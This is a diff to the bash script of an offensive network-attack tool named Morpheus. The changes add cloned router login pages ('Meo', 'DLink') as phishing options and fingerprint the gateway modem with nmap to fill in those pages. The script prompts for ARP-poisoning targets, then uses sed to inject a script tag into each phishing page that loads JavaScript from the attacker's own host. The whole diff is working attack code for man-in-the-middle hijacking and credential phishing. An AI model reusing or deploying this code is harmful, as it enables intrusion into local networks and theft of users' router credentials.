@@ -47,17 +47,7 @@ Reset="${Escape}[0m";
 }
 
 
-###
-# DEBUG SCRIPT OF MORPHEUS
-###
-Colors;
-if [ -e morpheus.sh ]; then
- :
-else
-echo ${RedF}[x]${white} Copy [${GreenF} me ${white}] to morpheus main folder and execute [${GreenF} me ${white}] from there ..${Reset};
-echo ${RedF}[x]${white} Also remmenber to config the settings File to store logfiles ..${Reset};
-exit
-fi
+
 
 # ---------------------
 # Variable declarations
@@ -1732,13 +1722,14 @@ rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison setti
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
 
 # chose what phishing webpage to use
-PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "default" FALSE "new one" --width 300 --height 180)
+PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose phishing webpage to use" --radiolist --column "Pick" --column "Option" TRUE "Default" FALSE "Meo" FALSE "DLink" --width 300 --height 220)
 
 
 
   # retrieve info about modem to inject into clone
   echo ${BlueF}[☠]${white} Gather Info about modem webpage${RedF}! ${Reset};
-  nmap -sV -PN -p 80 $GaTe > $IPATH/output/retrieve.log
+  nmap -sV -PN -p 80 $GaTe -oN $IPATH/output/retrieve.log | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Gather modem ip addr, mac addr and hostname .." --percentage=0 --auto-close --width 320
+
   # InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | awk {'print $4,$5,$6'}`
   InjE=`cat $IPATH/output/retrieve.log | egrep -m 1 "open" | cut -d '(' -f2 | cut -d ')' -f1` # it does not grep all servernames :(
   MaCa=`cat $IPATH/output/retrieve.log | egrep -m 1 "MAC" | awk {'print $3'}` # grab mac address ..
@@ -1756,16 +1747,22 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose p
   cp index.html index.rb
   cp login.html login.rb
   # chose 2º phishing webpage to use
-  if [ "$PHiS" = "new one" ]; then
+  if [ "$PHiS" = "Meo" ]; then
     cp new.html new.rb
+  fi
+  # chose 3 phishing webpage to use
+  if [ "$PHiS" = "DLink" ]; then
+    cp -r DLINK $ApachE/DLINK
   fi
 
   # grab modem ip addr
   MIP=`route -n | grep "UG" | awk {'print $2'} | tr -d '\n'`
   # chose 2º phishing webpage to use
-  if [ "$PHiS" = "new one" ]; then
+  if [ "$PHiS" = "Meo" ]; then
     sed -i "s/MoDemIP/$MIP/" new.html
     sed -i "s/MaCa/$MaCa/" new.html
+    sed -i "s/MoDemIP/$MIP/" login.html
+  elif [ "$PHiS" = "Default" ]; then
     sed -i "s/MoDemIP/$MIP/" login.html
   else
     sed -i "s/MoDemIP/$MIP/" login.html
@@ -1774,8 +1771,12 @@ PHiS=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Chose p
   sleep 1
 
   # chose 2º phishing webpage to use
-  if [ "$PHiS" = "new one" ]; then
+  if [ "$PHiS" = "Meo" ]; then
     sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" new.html > copy.html
+  elif [ "$PHiS" = "DLink" ]; then
+    cd DLINK
+    sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > $IPATH/bin/phishing/router-modem/copy.html
+    cd ..
   else
     sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
   fi
@@ -1842,6 +1843,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   rm $ApachE/index.html
   rm $ApachE/login.html
   rm -r $ApachE/router-modem
+  rm -r $ApachE/DLINK
   # rm -r $IPATH/output/clone
   cd $IPATH
 
